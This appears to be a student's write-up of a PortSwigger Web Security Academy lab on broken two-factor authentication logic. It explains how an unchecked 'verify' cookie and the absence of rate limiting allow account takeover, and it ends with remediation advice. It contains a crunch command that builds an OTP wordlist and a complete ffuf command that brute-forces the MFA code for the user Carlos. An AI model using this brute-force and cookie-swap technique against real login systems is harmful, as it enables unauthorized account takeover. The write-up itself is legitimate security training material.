# 2FA broken logic - PortSwigger Lab 31

**Severity:** Medium
**Target:** https://0a7000bf037d3f08800026e800f000b5.web-security-academy.net

## Summary
It's possible to redirect an authenticated cookie that passed the first /login phase to another non-logged-in credential like Carlos.
thus allowing you to request an MFA code from the server for Carlos. Furthermore, the MFA code lacks brute-force protection, 


## Vulnerability Details
**Type:** 2FA broken logic
**Root Cause:** The server uses a separate verify cookie to track which user is in the 2FA flow, without validating whether it matches the session.
**Endpoint:**  https://0a7000bf037d3f08800026e800f000b5.web-security-academy.net/login2

## Steps to Reproduce
1. First, create the list you will use for the mfa-code brute force attack with crunch.
2. After creating the wordlist and requesting the mfa-code from Carlos, use ffuf to brute the mfa-code.
3. After retrieving the result from ffuf with Carlos' mfa-code, with the wiener account at /login2 enter Carlos' mfa-code just to retrieve the mfa-code request.
4. Replace the verify request with ``carlos``
5. At the response. Get the new authentication cookie for Carlos at login/2 with the accepted mfa-code.
6. After that, perform a GET request with the repeater to /my-account?id=carlos with the new cookie.
7. Right-click on the response and then click on "show in browser," copy the link and paste it into the Firefox URL bar to go directly to the login page and bypass the lab.

## Proof of Concept

crunch wordlist 
```bash
crunch 4 4 0123456789 -o /home/luweed/Documents/otp.txt
```

ffuf attackline

```bash
     ffuf -w /home/luweed/Documents/otp.txt:FUZZ \
     -u https://0a7000bf037d3f08800026e800f000b5.web-security-academy.net/login2 \
     -X POST \
     -d "mfa-code=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Cookie: session=qBL1G83dNJ5f47Z6WE5rU1mfB9TsC0e8; verify=carlos" \
     -fc 200
```

## Result
<img width="1568" height="716" alt="image" src="https://github.com/user-attachments/assets/4f22ff48-5552-431f-8c11-b7339c479251" />


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
The server must validate that the verify cookie matches the authenticated session user before processing the 2FA code.
Add additional defense mechanisms such as CAPTCHA and permanent lockout. 
Also add a rate limit in mfa-code.
